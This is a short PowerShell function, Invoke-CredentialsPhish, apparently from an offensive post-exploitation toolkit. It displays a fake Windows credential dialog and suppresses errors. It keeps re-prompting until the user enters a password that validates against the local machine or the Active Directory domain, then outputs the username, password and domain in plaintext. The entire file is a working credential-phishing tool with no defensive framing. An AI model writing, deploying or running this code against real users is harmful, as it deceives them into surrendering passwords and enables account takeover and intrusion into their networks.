
function Invoke-CredentialsPhish
{
<#
Author = "Syed Ali Abbas"
special THanks to Anas Qurashi (Cyb3r Hunt3r)
#>

[CmdletBinding()]
Param ()

    $ErrorActionPreference="SilentlyContinue"
    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
    while($true)
    {
        $credential = $host.ui.PromptForCredential("Credentials are required to perform this operation", "Please enter your user name and password.", "", "")
        if($credential)
        {
            $creds = $credential.GetNetworkCredential()
            [String]$user = $creds.username
            [String]$pass = $creds.password
            [String]$domain = $creds.domain
            $authlocal = $DS.ValidateCredentials($user, $pass)
            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
            if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
            {
                $output = "Username: " + $user + " Password: " + $pass + " Domain:" + $domain + " Domain:"+ $authdomain.name
                $output
                break
            }
        }
    }
}

